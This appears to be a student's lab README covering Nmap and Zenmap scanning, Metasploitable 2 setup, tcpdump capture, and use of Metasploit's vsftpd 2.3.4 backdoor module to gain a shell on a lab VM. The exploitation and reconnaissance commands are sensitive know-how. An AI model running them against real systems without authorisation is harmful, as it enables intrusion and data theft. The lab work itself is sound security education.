
# 🔐 Network Security Lab: Nmap, Zenmap, Metasploit & Tcpdump

This project demonstrates hands-on cybersecurity skills in a virtual lab environment using **Kali Linux**, **Metasploitable 2**, and popular tools for scanning, vulnerability detection, and exploitation.

## 🛠️ Tools & Platforms Used
- VirtualBox (Kali Linux & Metasploitable 2)
- Nmap & Zenmap (GUI)
- Metasploit Framework
- Tcpdump (Packet analysis)

---

## 📚 Tasks & Key Findings

### 🔍 Task 1: Ping and Port Scanning with Nmap
- **Ping Scan**:  
  ```bash
  nmap -sn 192.168.150.128
  ```
  - Detected host with low latency (~0.00060s).
- **Remote Port Scan**:  
  ```bash
  sudo nmap -v -A scanme.nmap.org
  ```
  - Found open ports on `45.33.32.156`:  
    `22/tcp (SSH)`, `53/tcp (DNS)`, `80/tcp (HTTP)`, `9929/tcp`, `31337/tcp`

---

### 🌐 Task 2: Scanning via Zenmap
Performed different scan types on `scanme.nmap.org`:
- **Intense Scan** (includes ping & traceroute)
- **Quick Scan**
- **Regular Scan**
- **Quick Traceroute**

🔎 Key Observations:
- **Open Ports**: `22`, `25`, `80`, `135`, `9929`, `31337`
- **Filtered Ports**: e.g., `25/tcp (SMTP)`
- **Service Details**: e.g., `OpenSSH 6.6.1p1`, `Nping echo`
- Intense scans offer more detailed info; quick scans are faster but limited.

---

### 🖥️ Task 3: Metasploitable 2 Setup
- Downloaded from SourceForge and installed in VirtualBox as the target vulnerable machine.

---

### 🧪 Task 4: Host & Port Discovery
- **Network-wide Ping Sweep**:  
  ```bash
  sudo nmap -sn 192.168.150.0/24
  ```
- **Identified Target IP**: `192.168.150.131`
- **Version Detection**:
  ```bash
  sudo nmap -sV 192.168.150.131
  ```
  - Discovered open services (e.g., FTP, HTTP, SSH, Telnet)

---

### 💥 Task 5: Exploiting a Vulnerable Service
- **Targeted FTP Service**: `vsftpd 2.3.4` (port 21)
- Used Metasploit Framework:
  ```bash
  sudo msfconsole
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOST 192.168.150.131
  run
  ```
- Gained shell access & accessed:
  ```bash
  cat secret.txt
  ```

---

### 📘 Task 6: Key Concepts & Understanding

- **Ping**: Used in host discovery (e.g., `nmap -sn`) to measure latency.
- **Network Ports**: Logical endpoints used by protocols like TCP/UDP.
- **Vulnerable Services**: Services like outdated FTP that attackers can exploit.
- **Defense Strategy**: Restrict services/ports to business-necessary access only.

---

### 📡 Task 7: Packet Capture with Tcpdump
- Command:
  ```bash
  sudo tcpdump
  ```
- Captured real-time network traffic.
- Observed UDP packets and found no dropped packets—indicating stable networking.

---

## 🎯 Learning Outcome
- Performed real-world scanning and reconnaissance.
- Discovered and exploited vulnerabilities in a controlled setup.
- Gained practical knowledge of defensive and offensive network security techniques.
- Practiced traffic monitoring with tcpdump.

---
